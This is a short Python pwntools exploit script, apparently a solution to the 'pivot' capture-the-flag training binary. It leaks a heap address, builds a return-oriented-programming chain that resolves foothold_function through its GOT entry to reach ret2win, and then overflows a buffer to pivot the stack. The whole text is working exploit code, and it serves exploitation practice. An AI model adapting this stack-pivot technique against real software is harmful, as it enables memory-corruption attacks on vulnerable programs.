from pwn import *
context.binary=exe=ELF("./pivot",checksec=False)
p=process(exe.path)
input()

offset=0x28

ret=0x00000000004006b6
add_rax_rbp=0x00000000004009c4
pop_rbp=0x00000000004007c8
pop_rax=0x00000000004009bb
xchg_rax_rsp=0x00000000004009bd
mov_rax_ptr_rax=0x00000000004009c0
call_rax=0x00000000004006b0
offset2=0xa81-0x96a# distance between ret2win an foothold_Function
#distance betwee0x00000000004009bdn foothold_Function and base is 0x96a


foothold_got = 0x601040
foothold_plt = 0x400720

#####recv the leaked address ###############
p.recvuntil(b"to pivot:")
leaked_add=int(p.recvline(),16)
print(f"leak address:{hex(leaked_add)}")
############################################

payload1=p64(foothold_plt)+p64(pop_rax)+p64(foothold_got)+p64(mov_rax_ptr_rax)+p64(pop_rbp)+p64(offset2)+p64(add_rax_rbp)+p64(call_rax)
p.sendlineafter(b">",payload1)
payload2=b"A"*offset+p64(pop_rax)+p64(leaked_add)+p64(xchg_rax_rsp)
p.sendlineafter(b">",payload2)

p.interactive()